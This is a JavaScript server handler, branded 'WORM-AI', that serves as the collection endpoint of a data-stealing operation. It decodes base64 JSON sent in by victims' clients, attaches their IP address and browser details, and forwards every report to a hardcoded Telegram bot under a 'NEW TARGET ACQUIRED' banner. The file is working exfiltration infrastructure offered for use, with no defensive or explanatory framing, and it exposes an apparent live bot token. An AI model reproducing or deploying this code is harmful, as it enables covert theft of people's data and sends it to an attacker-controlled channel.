// ========================== WORM-AI💀🔥 CORE: DATA COLLECTOR ==========================
const BOT_TOKEN = '8362237525:AAEBqsZnXN_ceq7urqdt1cy-M8VxeJ7bCE8'; // ← توكن بوتك
const CHAT_ID   = '7932290530'; // ← ايدي محادثتك

const cache = new Map();
const MAX_CACHE_SIZE = 500;

// دالة لإنشاء معرف فريد لكل طلب
function uid() {
    return Math.random().toString(36).slice(2) + Date.now().toString(36);
}

// دالة لإرسال البيانات إلى Telegram مع تنسيق آمن
async function sendToTelegram(text) {
    // MarkdownV2 يتطلب تهريب هذه الأحرف
    const safeText = text.replace(/([_*\[\]()~`>#+=|{}.!-])/g, '\\$1');
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: safeText,
                parse_mode: 'MarkdownV2'
            } )
        });
    } catch (error) {
        console.error("Telegram API Error:", error);
    }
}

// المعالج الرئيسي للطلبات القادمة
export default async function handler(req, res) {
    // قبول طلبات POST فقط
    if (req.method !== 'POST') {
        return res.status(405).send({ error: 'Method Not Allowed' });
    }

    let body;
    try {
        // محاولة فك تشفير البيانات القادمة من Base64
        body = JSON.parse(atob(req.body));
    } catch (e) {
        return res.status(400).send({ error: 'Invalid Base64 or JSON format' });
    }

    // بناء كائن البيانات الكامل
    const report = {
        id: uid(),
        timestamp: new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' }),
        ip: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
        userAgent: req.headers['user-agent'],
        data: body
    };

    // إدارة الذاكرة المؤقتة
    cache.set(report.id, report);
    if (cache.size > MAX_CACHE_SIZE) {
        const oldestKey = cache.keys().next().value;
        cache.delete(oldestKey);
    }

    // إعداد الرسالة وإرسالها
    const message = `
*💀🔥 WORM\\-AI: NEW TARGET ACQUIRED* 👤
\\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\-
*⏱️ الوقت:* \`${report.timestamp}\`
*🌐 الآيبي:* \`${report.ip}\`
*📱 العميل:* \`${report.userAgent}\`
\\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\-
*📊 البيانات الكاملة:*
\`\`\`json
${JSON.stringify(report.data, null, 2)}
\`\`\`
    `;
    await sendToTelegram(message);

    // إرسال استجابة ناجحة بدون محتوى
    res.status(204).end();
}
